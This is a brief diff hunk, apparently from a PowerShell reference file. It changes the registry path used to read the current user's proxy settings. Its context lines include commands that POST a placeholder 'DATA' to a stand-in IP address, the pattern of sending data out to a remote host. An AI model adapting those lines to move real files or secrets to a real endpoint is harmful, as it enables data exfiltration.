@@ -13,4 +13,4 @@ Invoke-WebRequest -Uri 192.0.2.1 -Method Post -Body DATA
 echo DATA | Invoke-WebRequest -Uri 192.0.2.1 -Method Post
 
 # Get proxy settings of current user
-Get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
+Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
